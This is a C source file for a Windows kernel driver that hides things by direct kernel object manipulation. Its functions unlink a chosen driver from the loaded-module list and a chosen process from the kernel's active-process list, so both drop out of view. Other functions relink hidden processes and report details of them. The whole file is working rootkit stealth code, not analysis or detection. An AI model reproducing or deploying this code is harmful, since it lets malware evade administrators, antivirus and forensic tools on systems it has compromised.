#include "DKOM.h"
#include "ProcDkomGlobals.h"


NTSTATUS kernelobjs_hiding::HideSystemModule(DRIVER_OBJECT* DriverObject, PUNICODE_STRING DriverName) {
	// Assumes: DriverName is in "\\Driver\\DriverName" format
	PLDR_DATA_TABLE_ENTRY PreviousDriver = { 0 };
	PLDR_DATA_TABLE_ENTRY NextDriver = { 0 };
	PLDR_DATA_TABLE_ENTRY CurrentDriver = { 0 };
	HANDLE DriverHandle = NULL;
	KIRQL CurrIrql = { 0 };
	OBJECT_ATTRIBUTES DriverAttr = { 0 };
	IO_STATUS_BLOCK DriverStatus = { 0 };


	// DriverObject = NULL - object is not provided, need to find it by name: 
	if (DriverObject == NULL) {
		InitializeObjectAttributes(&DriverAttr, DriverName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
		if (!NT_SUCCESS(ZwCreateFile(&DriverHandle, OBJ_CASE_INSENSITIVE, &DriverAttr, &DriverStatus, NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ | FILE_SHARE_WRITE, FILE_OPEN, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0)) || DriverHandle == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver process - HideSystemModule(), Could not get handle for driver %wZ\n", DriverName);
			return STATUS_UNSUCCESSFUL;
		}
		if (!NT_SUCCESS(ObReferenceObjectByHandle(DriverHandle, FILE_ALL_ACCESS, *IoFileObjectType, KernelMode, (PVOID*)&DriverObject, NULL))) {
			DbgPrintEx(0, 0, "KMDFdriver process - HideSystemModule(), Could not get driver object for driver %wZ\n", DriverName);
			return STATUS_UNSUCCESSFUL;
		}
	}


	// Get needed permissions to modify driver service entries:
	CurrIrql = KeRaiseIrqlToDpcLevel();


	// Change last to last of next and next to next of last:
	CurrentDriver = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
	PreviousDriver = (PLDR_DATA_TABLE_ENTRY)CurrentDriver->InLoadOrderModuleList.Blink;
	NextDriver = (PLDR_DATA_TABLE_ENTRY)CurrentDriver->InLoadOrderModuleList.Flink;
	PreviousDriver->InLoadOrderModuleList.Flink = CurrentDriver->InLoadOrderModuleList.Flink;
	NextDriver->InLoadOrderModuleList.Blink = CurrentDriver->InLoadOrderModuleList.Blink;


	// Isolate current driver service so last and next will both point to itself:
	CurrentDriver->InLoadOrderModuleList.Blink = (PLIST_ENTRY)CurrentDriver;
	CurrentDriver->InLoadOrderModuleList.Flink = (PLIST_ENTRY)CurrentDriver;
	KeLowerIrql(CurrIrql);
	return STATUS_SUCCESS;
}


NTSTATUS process::HideProcess(ULONG64 ProcessId, BOOL IsStrict) {
	// Assumes: PID is validated and not 0 in the entry to this function
	PACTEPROCESS CurrentProcess = NULL;
	LIST_ENTRY* CurrentList = NULL;
	LIST_ENTRY* PreviousList = NULL;
	LIST_ENTRY* NextList = NULL;

	CurrentProcess = (PACTEPROCESS)PsInitialSystemProcess;
	PreviousList = &CurrentProcess->ActiveProcessLinks;
	CurrentList = PreviousList->Flink;
	CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
	NextList = CurrentList->Flink;

	while (CurrentList != NULL) {
		DbgPrintEx(0, 0, "KMDFdriver process - HideProcess(), Current PID = %llu\n", (ULONG64)CurrentProcess->UniqueProcessId);
		if ((ULONG64)CurrentProcess->UniqueProcessId == ProcessId) {
			PreviousList->Flink = NextList;  // Also works for cases when NextList is NULL
			if (NextList != NULL) {
				NextList->Blink = PreviousList;
			}
			ProcessHide.AddToHidden((PEPROCESS)CurrentProcess);
			DbgPrintEx(0, 0, "KMDFdriver process - HideProcess(), Found process to hide (%llu)\n", ProcessId);
			CurrentList->Blink = CurrentList;
			CurrentList->Flink = CurrentList;
			return STATUS_SUCCESS;
		}
		PreviousList = CurrentList;
		CurrentList = NextList;
		if (CurrentList != NULL) {
			NextList = CurrentList->Flink;
			CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
		}
	}
	DbgPrintEx(0, 0, "KMDFdriver process - HideProcess(), Did not find process to hide (%llu)\n", ProcessId);
	if (IsStrict) {
		return STATUS_NOT_FOUND;
	}
	return STATUS_SUCCESS;
}


NTSTATUS process::UnhideProcess(ULONG64 ProcessId, ULONG HiddenIndex) {
	// Assumes: PID is validated and not 0 in the entry to this function
	PACTEPROCESS CurrentProcess = NULL;
	PACTEPROCESS UnhideProcess = NULL;
	PACTEPROCESS PreviousProcess = NULL;
	LIST_ENTRY* CurrentList = NULL;
	LIST_ENTRY* PreviousList = NULL;
	LIST_ENTRY* NextList = NULL;
	if (HiddenIndex != 0) {
		if (HiddenIndex >= ProcessHide.HiddenCount) {
			DbgPrintEx(0, 0, "KMDFdriver process %llu - UnhideProcess(), Removing form hidden failed - index over hidden count (%lu >= %lu)\n", ProcessId, HiddenIndex, ProcessHide.HiddenCount);
			return STATUS_INVALID_PARAMETER;
		}
		if (!ProcessHide.RemoveFromHidden(ProcessId, HiddenIndex, (PEPROCESS*)(&UnhideProcess))) {
			DbgPrintEx(0, 0, "KMDFdriver process %llu - UnhideProcess(), Removing form hidden failed, index based\n", ProcessId);
			return STATUS_UNSUCCESSFUL;
		}
	}
	else {
		if (!ProcessHide.RemoveFromHidden(ProcessId, ProcessHide.HiddenCount, (PEPROCESS*)(&UnhideProcess))) {
			DbgPrintEx(0, 0, "KMDFdriver process %llu - UnhideProcess(), Removing form hidden failed, PID based\n", ProcessId);
			return STATUS_UNSUCCESSFUL;
		}
	}
	CurrentProcess = (PACTEPROCESS)PsInitialSystemProcess;
	PreviousList = &CurrentProcess->ActiveProcessLinks;
	CurrentList = PreviousList->Flink;
	CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
	NextList = CurrentList->Flink;
	while (CurrentList != NULL) {
		// Iterate until the list finishes to add the unhidden process:
		PreviousList = CurrentList;
		CurrentList = NextList;
		if (CurrentList != NULL) {
			NextList = CurrentList->Flink;
			CurrentProcess = (PACTEPROCESS)((ULONG64)CurrentList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
		}
	}
	PreviousList->Flink = &UnhideProcess->ActiveProcessLinks;
	(&UnhideProcess->ActiveProcessLinks)->Blink = PreviousList;
	(&UnhideProcess->ActiveProcessLinks)->Flink = NULL;
	PreviousProcess = (PACTEPROCESS)((ULONG64)PreviousList - ((ULONG64)&CurrentProcess->ActiveProcessLinks - (ULONG64)CurrentProcess));
	DbgPrintEx(0, 0, "KMDFdriver process - UnhideProcess(), Found unhide placement for process %llu at the end (after %llu)\n", ProcessId, (ULONG64)PreviousProcess->UniqueProcessId);
	return STATUS_SUCCESS;
}


NTSTATUS process::ListHiddenProcesses(ULONG64* ListSize, PVOID* ListAddress) {
	PVOID EprocessList = NULL;
	PACTEPROCESS CurrentProcessPointer = NULL;
	ACTEPROCESS CurrentProcess = { 0 };
	SHORTENEDACTEPROCESS CurrentProcessShortened = { 0 };
	if (ProcessHide.BufferSize == 0) {
		*ListSize = 0;
		*ListAddress = &ProcessHide;
		DbgPrintEx(0, 0, "KMDFdriver process - ListHiddenProcesses(), List is empty!\n");
		return STATUS_SUCCESS;
	}
	EprocessList = ExAllocatePoolWithTag(NonPagedPool, ProcessHide.HiddenCount * sizeof(SHORTENEDACTEPROCESS), 'LhPb');
	if (EprocessList == NULL) {
		*ListSize = 0;
		*ListAddress = &ProcessHide;
		DbgPrintEx(0, 0, "KMDFdriver process - ListHiddenProcesses(), Cannot allocate memory!\n");
		return STATUS_MEMORY_NOT_ALLOCATED;
	}
	for (ULONG CurrentIndex = 0; CurrentIndex < ProcessHide.HiddenCount; CurrentIndex++) {
		RtlCopyMemory(&CurrentProcessPointer, (PVOID)((ULONG64)ProcessHide.HiddenList + (CurrentIndex * sizeof(PEPROCESS))), sizeof(PEPROCESS));
		RtlCopyMemory(&CurrentProcess, CurrentProcessPointer, sizeof(ACTEPROCESS));
		CurrentProcessShortened.ActiveThreads = CurrentProcess.ActiveThreads;
		CurrentProcessShortened.Cookie = CurrentProcess.Cookie;
		CurrentProcessShortened.CreateTime = CurrentProcess.CreateTime;
		CurrentProcessShortened.ExitStatus = CurrentProcess.ExitStatus;
		CurrentProcessShortened.Flags = CurrentProcess.Flags;
		CurrentProcessShortened.HighestUserAddress = CurrentProcess.HighestUserAddress;
		RtlCopyMemory(&CurrentProcessShortened.ImageFileName, &CurrentProcess.ImageFileName, 15);
		CurrentProcessShortened.LastThreadExitStatus = CurrentProcess.LastThreadExitStatus;
		CurrentProcessShortened.ReadOperationCount = CurrentProcess.ReadOperationCount;
		CurrentProcessShortened.WriteOperationCount = CurrentProcess.WriteOperationCount;
		CurrentProcessShortened.OtherOperationCount = CurrentProcess.OtherOperationCount;
		CurrentProcessShortened.OwnerProcessId = CurrentProcess.OwnerProcessId;
		CurrentProcessShortened.PageDirectoryPte = CurrentProcess.PageDirectoryPte;
		CurrentProcessShortened.PeakVirtualSize = CurrentProcess.PeakVirtualSize;
		CurrentProcessShortened.VirtualSize = CurrentProcess.VirtualSize;
		CurrentProcessShortened.PriorityClass = CurrentProcess.PriorityClass;
		CurrentProcessShortened.UniqueProcessId = CurrentProcess.UniqueProcessId;
		RtlCopyMemory((PVOID)((ULONG64)EprocessList + (CurrentIndex * sizeof(SHORTENEDACTEPROCESS))), &CurrentProcessShortened, sizeof(SHORTENEDACTEPROCESS));
	}
	*ListSize = ProcessHide.HiddenCount * sizeof(SHORTENEDACTEPROCESS);
	*ListAddress = EprocessList;
	DbgPrintEx(0, 0, "KMDFdriver process - ListHiddenProcesses(), (%p, %llu)\n", *ListAddress, *ListSize);
	return STATUS_SUCCESS;
}